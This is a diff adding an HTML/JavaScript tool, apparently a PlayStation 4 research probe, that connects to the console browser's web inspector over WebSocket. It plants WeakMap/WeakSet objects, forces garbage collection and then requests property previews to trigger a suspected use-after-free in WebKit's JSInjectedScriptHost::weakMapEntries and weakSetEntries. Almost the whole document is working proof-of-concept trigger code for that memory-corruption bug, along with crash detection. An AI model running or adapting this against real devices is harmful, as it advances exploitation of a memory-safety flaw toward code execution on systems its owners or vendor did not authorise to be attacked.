@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PS4 WeakMap UAF Probe</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap');
+
+  :root {
+    --bg:       #0a0e14;
+    --panel:    #111820;
+    --border:   #1e2d3d;
+    --cyan:     #39d0d8;
+    --cyan-dim: #1b6e73;
+    --green:    #3ddc84;
+    --red:      #ff4d6d;
+    --yellow:   #f0c040;
+    --muted:    #4a6278;
+    --text:     #c5d8e8;
+    --mono: 'JetBrains Mono', 'Courier New', monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: var(--mono);
+    font-size: 13px;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  header {
+    display: flex;
+    align-items: baseline;
+    gap: 16px;
+    margin-bottom: 20px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 14px;
+  }
+
+  header h1 {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--cyan);
+    letter-spacing: 0.04em;
+  }
+
+  header .sub {
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: 320px 1fr;
+    gap: 16px;
+    height: calc(100vh - 100px);
+  }
+
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .panel-title {
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    color: var(--muted);
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--border);
+    text-transform: uppercase;
+  }
+
+  .panel-body { padding: 12px; flex: 1; display: flex; flex-direction: column; gap: 10px; }
+
+  .field { display: flex; flex-direction: column; gap: 4px; }
+
+  .field label {
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+  }
+
+  .field input {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    padding: 6px 8px;
+    border-radius: 2px;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  .field input:focus { border-color: var(--cyan-dim); }
+
+  .row-fields { display: grid; grid-template-columns: 1fr 80px; gap: 8px; }
+
+  .btn {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 7px 10px;
+    border-radius: 2px;
+    cursor: pointer;
+    text-align: left;
+    transition: border-color 0.15s, color 0.15s;
+    white-space: nowrap;
+  }
+  .btn:hover { border-color: var(--cyan-dim); color: var(--cyan); }
+
+  .btn-primary { border-color: var(--cyan-dim); color: var(--cyan); }
+  .btn-primary:hover { background: var(--cyan-dim); color: var(--bg); }
+
+  .btn-danger { border-color: #5a1e2a; color: var(--red); }
+  .btn-danger:hover { background: #3a0f1a; }
+
+  .btn:disabled { opacity: 0.35; cursor: default; }
+
+  .sep {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2px 0;
+  }
+
+  .status-row {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 12px;
+    border-top: 1px solid var(--border);
+    font-size: 11px;
+  }
+
+  .dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--muted);
+    flex-shrink: 0;
+  }
+  .dot.ok     { background: var(--green); box-shadow: 0 0 6px var(--green); }
+  .dot.err    { background: var(--red);   box-shadow: 0 0 6px var(--red); }
+  .dot.warn   { background: var(--yellow); box-shadow: 0 0 6px var(--yellow); }
+
+  #status-text { color: var(--muted); }
+
+  /* log */
+  #log {
+    flex: 1;
+    overflow-y: auto;
+    padding: 10px 12px;
+    font-size: 12px;
+    line-height: 1.6;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  #log::-webkit-scrollbar { width: 4px; }
+  #log::-webkit-scrollbar-track { background: transparent; }
+  #log::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+  .log-ok   { color: var(--green); }
+  .log-err  { color: var(--red); }
+  .log-warn { color: var(--yellow); }
+  .log-info { color: var(--cyan); }
+  .log-dim  { color: var(--muted); }
+
+  .log-banner {
+    color: var(--cyan);
+    border-top: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+    margin: 4px 0;
+    padding: 2px 0;
+  }
+
+  .log-crash {
+    color: var(--red);
+    font-weight: 600;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>⬡ PS4 WeakMap UAF Probe</h1>
+  <span class="sub">JSInjectedScriptHost::weakMapEntries / weakSetEntries — CVE candidate</span>
+</header>
+
+<div class="grid">
+
+  <!-- painel esquerdo: controles -->
+  <div class="panel">
+    <div class="panel-title">Alvo</div>
+    <div class="panel-body">
+
+      <div class="row-fields">
+        <div class="field">
+          <label>IP do PS4</label>
+          <input id="ip" value="192.168.0.x" spellcheck="false">
+        </div>
+        <div class="field">
+          <label>Porta</label>
+          <input id="port" value="9222" spellcheck="false">
+        </div>
+      </div>
+
+      <hr class="sep">
+
+      <div class="panel-title" style="padding:0;border:none;margin-bottom:4px">Fase 1 — Acesso</div>
+
+      <button class="btn btn-primary" onclick="cmdConnect()">
+        ▶ Conectar ao Inspector
+      </button>
+
+      <hr class="sep">
+
+      <div class="panel-title" style="padding:0;border:none;margin-bottom:4px">Fase 2 — Setup</div>
+
+      <div class="field">
+        <label>Entradas no WeakMap/WeakSet</label>
+        <input id="count" value="1000" spellcheck="false">
+      </div>
+
+      <button class="btn" id="btn-setup" onclick="cmdSetup()" disabled>
+        ⬡ Criar WeakMap + WeakSet no PS4
+      </button>
+
+      <hr class="sep">
+
+      <div class="panel-title" style="padding:0;border:none;margin-bottom:4px">Fase 3 — Trigger</div>
+
+      <button class="btn btn-danger" id="btn-wm" onclick="cmdTrigger('wm')" disabled>
+        ⚡ Trigger weakMapEntries()
+      </button>
+
+      <button class="btn btn-danger" id="btn-ws" onclick="cmdTrigger('ws')" disabled>
+        ⚡ Trigger weakSetEntries()
+      </button>
+
+      <button class="btn btn-danger" id="btn-both" onclick="cmdTriggerBoth()" disabled>
+        ⚡⚡ Trigger ambos + GC loop
+      </button>
+
+      <hr class="sep">
+
+      <button class="btn" onclick="clearLog()" style="font-size:11px;color:var(--muted)">
+        ✕ Limpar log
+      </button>
+
+    </div>
+
+    <div class="status-row">
+      <div class="dot" id="status-dot"></div>
+      <span id="status-text">desconectado</span>
+    </div>
+  </div>
+
+  <!-- painel direito: log -->
+  <div class="panel">
+    <div class="panel-title" style="display:flex;justify-content:space-between;align-items:center">
+      <span>Output</span>
+      <span id="log-count" style="color:var(--muted)"></span>
+    </div>
+    <div id="log"></div>
+  </div>
+
+</div>
+
+<script>
+'use strict';
+
+// ─── estado ─────────────────────────────────────────────────────────────────
+let ws          = null;
+let cmdId       = 0;
+let pending     = {};
+let wmObjectId  = null;
+let wsObjectId  = null;
+let logLines    = 0;
+
+// ─── log ────────────────────────────────────────────────────────────────────
+function esc(s) {
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;');
+}
+
+function log(msg, cls = 'dim') {
+  const el = document.getElementById('log');
+  const ts = new Date().toTimeString().slice(0,8);
+  el.innerHTML += `<span class="log-${cls}">[${ts}] ${esc(msg)}\n</span>`;
+  el.scrollTop = el.scrollHeight;
+  document.getElementById('log-count').textContent = `${++logLines} linhas`;
+}
+
+function logBanner(msg) {
+  log('─'.repeat(50), 'dim');
+  const el = document.getElementById('log');
+  el.innerHTML += `<span class="log-banner"> ${esc(msg)}\n</span>`;
+}
+
+function clearLog() {
+  document.getElementById('log').innerHTML = '';
+  logLines = 0;
+  document.getElementById('log-count').textContent = '';
+}
+
+// ─── status dot ─────────────────────────────────────────────────────────────
+function setStatus(text, state = '') {
+  document.getElementById('status-text').textContent = text;
+  const dot = document.getElementById('status-dot');
+  dot.className = 'dot' + (state ? ' ' + state : '');
+}
+
+// ─── habilitar botões ────────────────────────────────────────────────────────
+function setConnected(yes) {
+  ['btn-setup','btn-wm','btn-ws','btn-both']
+    .forEach(id => document.getElementById(id).disabled = !yes);
+}
+
+// ─── WebSocket ───────────────────────────────────────────────────────────────
+function rejectAll(reason) {
+  Object.values(pending).forEach(cb => cb.reject(new Error(reason)));
+  pending = {};
+}
+
+function send(method, params = {}, timeoutMs = 7000) {
+  return new Promise((resolve, reject) => {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
+      return reject(new Error('sem conexão'));
+    }
+    const id = ++cmdId;
+    pending[id] = { resolve, reject };
+    ws.send(JSON.stringify({ id, method, params }));
+
+    const timer = setTimeout(() => {
+      if (pending[id]) {
+        delete pending[id];
+        reject(new Error('timeout'));
+      }
+    }, timeoutMs);
+
+    pending[id].timer = timer;
+  });
+}
+
+async function tryPath(url) {
+  return new Promise((resolve, reject) => {
+    const sock = new WebSocket(url);
+    const t = setTimeout(() => { sock.close(); reject(new Error('timeout')); }, 3000);
+
+    sock.onopen = () => {
+      clearTimeout(t);
+      ws = sock;
+
+      sock.onmessage = e => {
+        let msg;
+        try { msg = JSON.parse(e.data); } catch { return; }
+
+        if (msg.id && pending[msg.id]) {
+          const cb = pending[msg.id];
+          clearTimeout(cb.timer);
+          delete pending[msg.id];
+          msg.error ? cb.reject(msg.error) : cb.resolve(msg.result ?? {});
+        } else if (msg.method) {
+          log(`← evento: ${msg.method}`, 'dim');
+        }
+      };
+
+      sock.onclose = e => {
+        const wasConnected = !!ws;
+        ws = null;
+        setConnected(false);
+        setStatus('desconectado', 'err');
+        rejectAll('conexão fechada');
+        if (wasConnected) {
+          log(`WebSocket fechou (code=${e.code}) — browser pode ter crashado`, 'err');
+          document.getElementById('log').innerHTML +=
+            `<span class="log-crash">\n!!! CONEXÃO PERDIDA — crash/reboot do browser PS4 é possível\n\n</span>`;
+        }
+      };
+
+      sock.onerror = () => {};
+      resolve(sock);
+    };
+
+    sock.onerror = () => { clearTimeout(t); sock.close(); reject(new Error('recusado')); };
+  });
+}
+
+// ─── Fase 1: conectar ────────────────────────────────────────────────────────
+async function cmdConnect() {
+  if (ws) { ws.close(); ws = null; }
+
+  const ip   = document.getElementById('ip').value.trim();
+  const port = document.getElementById('port').value.trim();
+
+  logBanner(`Conectando → ${ip}:${port}`);
+  setStatus('conectando…', 'warn');
+  setConnected(false);
+
+  const paths = [
+    `ws://${ip}:${port}`,
+    `ws://${ip}:${port}/devtools/page/1`,
+    `ws://${ip}:${port}/devtools`,
+  ];
+
+  let ok = false;
+  for (const p of paths) {
+    log(`tentando ${p}…`);
+    try {
+      await tryPath(p);
+      log(`conectado: ${p}`, 'ok');
+      ok = true;
+      break;
+    } catch (e) {
+      log(`  ${p} → ${e.message}`, 'err');
+    }
+  }
+
+  if (!ok) {
+    setStatus('sem resposta', 'err');
+    log('Inspector não acessível — porta fechada ou PS4 não está em modo debug', 'err');
+    return;
+  }
+
+  setStatus(`${ip}:${port}`, 'ok');
+
+  try {
+    await send('Runtime.enable');
+    log('Runtime.enable OK — protocolo CDP respondeu', 'ok');
+    setConnected(true);
+  } catch (e) {
+    log(`Runtime.enable: ${e.message}`, 'warn');
+    // tenta mesmo assim — alguns builds usam protocolo ligeiramente diferente
+    setConnected(true);
+  }
+}
+
+// ─── Script de setup (avaliado no contexto do PS4) ───────────────────────────
+function buildSetupScript(count) {
+  return `(function() {
+    window.__uafWM = new WeakMap();
+    window.__uafWS = new WeakSet();
+
+    // chaves sem referência forte — elegíveis para coleta pelo GC
+    for (var i = 0; i < ${count}; i++) {
+        window.__uafWM.set({}, i);
+        window.__uafWS.add({});
+    }
+
+    // função gc() do próprio WebKit — força uma coleta Eden
+    // objetivo: promover as chaves para o heap velho sem coletar ainda,
+    // para que a coleta que importa ocorra DURANTE a iteração do inspector
+    function gc() {
+        function gcRec(n) {
+            if (n < 1) return {};
+            var temp = { i: "ab" + i + (i / 100000) };
+            temp += "foo";
+            gcRec(n - 1);
+        }
+        for (var i = 0; i < 10000; i++) gcRec(10);
+    }
+    gc();
+
+    return "ok:" + ${count};
+})()`;
+}
+
+// ─── Fase 2: setup ───────────────────────────────────────────────────────────
+async function cmdSetup() {
+  logBanner('Setup WeakMap / WeakSet no PS4');
+
+  const count = parseInt(document.getElementById('count').value) || 1000;
+  log(`criando ${count} entradas com chaves sem referência forte…`);
+
+  try {
+    const r = await send('Runtime.evaluate', {
+      expression: buildSetupScript(count),
+      objectGroup: 'uaf',
+      returnByValue: true,
+      generatePreview: false
+    });
+    log(`avaliação: ${r?.result?.value}`, 'ok');
+  } catch (e) {
+    log(`setup falhou: ${e.message}`, 'err');
+    return;
+  }
+
+  // obtém objectIds
+  wmObjectId = await getObjectId('window.__uafWM', 'WeakMap');
+  wsObjectId = await getObjectId('window.__uafWS', 'WeakSet');
+}
+
+async function getObjectId(expr, label) {
+  try {
+    const r = await send('Runtime.evaluate', {
+      expression: expr,
+      objectGroup: 'uaf',
+      returnByValue: false,
+      generatePreview: false
+    });
+    const id = r?.result?.objectId;
+    log(`${label} objectId: ${id ?? '(nulo)'}`, id ? 'ok' : 'err');
+    return id ?? null;
+  } catch (e) {
+    log(`${label} objectId: ${e.message}`, 'err');
+    return null;
+  }
+}
+
+// ─── Fase 3: trigger ─────────────────────────────────────────────────────────
+/*
+  Runtime.getProperties com generatePreview:true sobre um WeakMap/WeakSet
+  faz o InjectedScript.js do inspector chamar:
+    InjectedScriptHost.weakMapEntries(object, limit)   → JSInjectedScriptHost::weakMapEntries()
+    InjectedScriptHost.weakSetEntries(object, limit)   → JSInjectedScriptHost::weakSetEntries()
+
+  O C++ itera weakMapData() enquanto constructEmptyObject / putDirectIndex
+  podem disparar GC que sweepa o próprio HashMap sendo iterado.
+  Se o browser crashar, o WebSocket será fechado — detectado via onclose().
+*/
+async function triggerOne(objectId, label, fnName) {
+  if (!objectId) {
+    log(`${label}: sem objectId — execute Setup primeiro`, 'err');
+    return false;
+  }
+
+  logBanner(`Trigger ${label} → ${fnName}()`);
+  log('enviando Runtime.getProperties com generatePreview=true…', 'warn');
+  log('crash → WebSocket fecha ou timeout', 'info');
+
+  const t0 = Date.now();
+  try {
+    const r = await send('Runtime.getProperties', {
+      objectId,
+      ownProperties: false,
+      generatePreview: true          // ← aciona weakMapEntries / weakSetEntries no C++
+    }, 10000);
+
+    const elapsed = Date.now() - t0;
+    const preview = JSON.stringify(r).slice(0, 400);
+    log(`respondeu em ${elapsed}ms`, 'ok');
+    log(`payload (truncado): ${preview}`, 'dim');
+    log(`${label}: sem crash detectado neste ciclo`, 'warn');
+    return false;
+
+  } catch (e) {
+    const elapsed = Date.now() - t0;
+    if (e.message === 'timeout') {
+      log(`TIMEOUT após ${elapsed}ms — browser não respondeu ao getProperties`, 'err');
+      log('freeze ou crash do processo do browser', 'err');
+    } else if (e.message === 'conexão fechada') {
+      log(`CONEXÃO FECHADA durante ${label} (${elapsed}ms)`, 'err');
+      log('browser encerrou o socket — crash confirmado', 'err');
+    } else {
+      log(`erro: ${JSON.stringify(e)}`, 'err');
+    }
+    return true; // possível crash
+  }
+}
+
+async function cmdTrigger(which) {
+  if (which === 'wm') await triggerOne(wmObjectId, 'WeakMap', 'weakMapEntries');
+  if (which === 'ws') await triggerOne(wsObjectId, 'WeakSet', 'weakSetEntries');
+}
+
+// trigger combinado com GC loop entre os ciclos para maximizar pressão
+async function cmdTriggerBoth() {
+  logBanner('Trigger combinado — WeakMap + WeakSet com GC loop');
+
+  const gcLoop = `(function() {
+    function gc() {
+        function gcRec(n) {
+            if (n < 1) return {};
+            var temp = { i: "ab" + i + (i / 100000) };
+            temp += "foo";
+            gcRec(n - 1);
+        }
+        for (var i = 0; i < 10000; i++) gcRec(10);
+    }
+    // 3 ciclos de GC para encher o Eden antes do inspector iterar
+    gc(); gc(); gc();
+    return "gc:done";
+  })()`;
+
+  // GC antes do primeiro trigger
+  try {
+    const r = await send('Runtime.evaluate', {
+      expression: gcLoop,
+      returnByValue: true,
+      generatePreview: false
+    });
+    log(`pré-GC: ${r?.result?.value}`, 'dim');
+  } catch (e) {
+    log(`pré-GC: ${e.message}`, 'warn');
+  }
+
+  const wmCrash = await triggerOne(wmObjectId, 'WeakMap', 'weakMapEntries');
+  if (wmCrash) return;
+
+  // GC entre os dois triggers
+  try {
+    await send('Runtime.evaluate', { expression: gcLoop, returnByValue: true, generatePreview: false });
+  } catch (e) { /* ignora */ }
+
+  await triggerOne(wsObjectId, 'WeakSet', 'weakSetEntries');
+}
+</script>
+</body>
+</html>
